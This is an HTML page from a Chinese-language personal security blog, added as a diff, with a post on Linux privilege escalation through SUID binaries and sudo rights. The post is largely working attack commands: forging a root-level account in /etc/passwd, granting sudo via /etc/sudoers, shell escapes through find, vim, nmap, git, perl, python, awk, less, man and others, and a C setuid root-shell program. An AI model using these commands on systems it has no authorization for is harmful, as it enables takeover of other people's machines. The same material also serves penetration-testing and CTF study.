@@ -1,0 +1,347 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Linux 提权 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Linux 提权此文章仅SUID和SUDO提权
+
+GTFOBins: https://gtfobins.github.io/
+
+SUID该文件在执行时会以文件所有者的身份来运行
+12# 查找拥有SUID权限的文件find / -perm -u=s -type f 2&amp;gt;/dev/null
+
+以下方式都需SUID权限
+cp12345678910openssl passwd -1 -salt 123 123456# $1$123$7mft0jKnzzvAdU4t0unTG1cp /etc/passwd ./# 写入（改写root第二参数）# root:x:0:0:root:/root:/bin/bashhacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:root:/root:/bin/bashcp ./passwd /etc/passwdsu hacker
+
+find"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Linux 提权"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Linux 提权</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h1><p>此文章仅SUID和SUDO提权</p>
+<blockquote>
+<p>GTFOBins: <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+</blockquote>
+<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>该文件在执行时会以文件所有者的身份来运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找拥有SUID权限的文件</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>以下方式都需SUID权限</p>
+<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt 123 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">$1$123<span class="variable">$7mft0jKnzzvAdU4t0unTG1</span></span></span><br><span class="line"></span><br><span class="line">cp /etc/passwd ./</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入（改写root第二参数）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">cp ./passwd /etc/passwd</span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find test -exec /bin/bash \;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">test</span>文件存在，bash中以分号结束</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudoers: 用于授权普通用户执行特权命令(<span class="built_in">sudo</span>)</span></span><br><span class="line"></span><br><span class="line">vim /etc/sudoers</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入</span></span><br><span class="line">test    ALL=(ALL:ALL) ALL	# root    ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line">sudo -i 或 sudo 命令</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">vim /etc/passwd</span><br><span class="line">:set shell = &#x27;/bin/sh&#x27;</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap2.02-5.21</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="meta prompt_">nmap&gt; </span><span class="language-bash">!sh</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano #进入nano编辑器</span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br></pre></td></tr></table></figure>
+
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>用户可写入可执行文件提权，以c为例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// c.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译</span></span><br><span class="line"><span class="comment">// gcc c.c -o shell</span></span><br><span class="line"><span class="comment">// 放在/bin下，再赋SUID权限</span></span><br><span class="line"><span class="comment">// 执行    </span></span><br><span class="line"><span class="comment">// ./shell</span></span><br></pre></td></tr></table></figure>
+
+<p>…</p>
+<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>以<code>root</code>的身份来执行特定的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/sudoers 用于授权普通用户执行特权命令(sudo)</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">vim /etc/sudoers</span><br><span class="line"></span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line">test    ALL=(ALL:ALL) ALL</span><br><span class="line">hack    ALL=(ALL:ALL) /usr/bin/cp,/usr/bin/awk ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1</span></span><br><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2</span></span><br><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/passwd（文件即可）</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo more /etc/passwd（文件即可）</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>…</p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/08/20/Mysql/Mysql UDF Priesc/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/07/30/Mysql/Mysql Inject/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Linux/">Linux<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Priesc/">Priesc<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Linux-%E6%8F%90%E6%9D%83"><span class="toc-article-text">Linux 提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SUID"><span class="toc-article-text">SUID</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#cp"><span class="toc-article-text">cp</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#find"><span class="toc-article-text">find</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#vim"><span class="toc-article-text">vim</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nano"><span class="toc-article-text">nano</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-article-text">脚本</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#sudo"><span class="toc-article-text">sudo</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#git"><span class="toc-article-text">git</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#perl"><span class="toc-article-text">perl</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#python"><span class="toc-article-text">python</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#awk"><span class="toc-article-text">awk</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#vi"><span class="toc-article-text">vi</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#less"><span class="toc-article-text">less</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#more"><span class="toc-article-text">more</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#man"><span class="toc-article-text">man</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
